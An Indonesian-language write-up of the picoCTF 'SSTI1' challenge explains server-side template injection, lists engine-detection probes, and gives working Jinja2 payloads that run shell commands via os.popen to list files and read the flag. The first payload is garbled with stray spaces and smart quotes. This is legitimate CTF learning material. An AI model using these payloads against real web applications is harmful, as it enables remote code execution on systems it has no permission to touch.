# SSTI1

saya akan memberikan solusi terperinci untuk tantangan SSTI1 dari kategori eksploitasi web PICOCTF, yang dikategorikan sebagai tantangan level yang mudah.

Nama tantangan-SSTI, adalah kependekan dari injeksi template sisi server. SSTI terjadi ketika aplikasi web memungkinkan pengguna untuk mengirimkan data yang diproses oleh mesin templat di server tanpa validasi yang tepat. Mesin template digunakan untuk menghasilkan konten dinamis, namun jika input yang diberikan pengguna tidak disanitasi, penyerang dapat menyuntikkan kode berbahaya yang dijalankan server.

Dalam hal ini, untuk mengidentifikasi mesin templat mana yang digunakan oleh aplikasi, kami dapat menyuntikkan muatan tertentu dan mengamati responsnya. Di bawah ini adalah beberapa mesin templat umum dan muatan uji yang sesuai:

```bash
Jinja2 (Python Flask/Django): {{ 7*7 }}
Freemarker (Java): ${7*7}
Velocity (Java): #set($a = 7*7)${a}
Thymeleaf (Java): ${7*7}
Twig (PHP Symfony): {{ 7*7 }}
Smarty (PHP): {$7*7}
Mako (Python): <% print 7*7 %>
```

## Documentation

[Documentation](/images/1.png)

[Documentation](/images/2.png)

Sekarang untuk menyelesaikan tantangan, kita perlu menemukan nilai bendera yang bisa kita dapatkan dengan melakukan injeksi perintah atau serangan eksekusi kode jarak jauh. Kami dapat mencari muatan yang tersedia sehubungan dengan Jinja2 untuk menjalankan injeksi perintah.

Mari kita berikan input seperti di bawah ini :

```bash
  {{self._templateReference__context.cycler .__ init __.__ global __. os.popen (‘whoami’) .read ()}}
```

![App Screenshot](/images/3.png)

Telah dikonfirmasi bahwa aplikasi rentan terhadap serangan injeksi perintah dan sekarang kita dapat mencari file flag menggunakan perintah ‘LS’ untuk mendaftar file yang tersedia di direktori Currect dengan memberikan input seperti di bawah ini -

```bash
  {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen(‘ls’).read() }}
```

![App Screenshot](/images/4.png)

Untungnya, kami memiliki file flag di folder yang sama sehingga kami tidak perlu mencarinya lebih lanjut dan kami dapat langsung membaca konten file flag menggunakan perintah CAT seperti yang ditunjukkan di bawah ini -

```bash
  {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen(‘cat flag’).read() }}
```
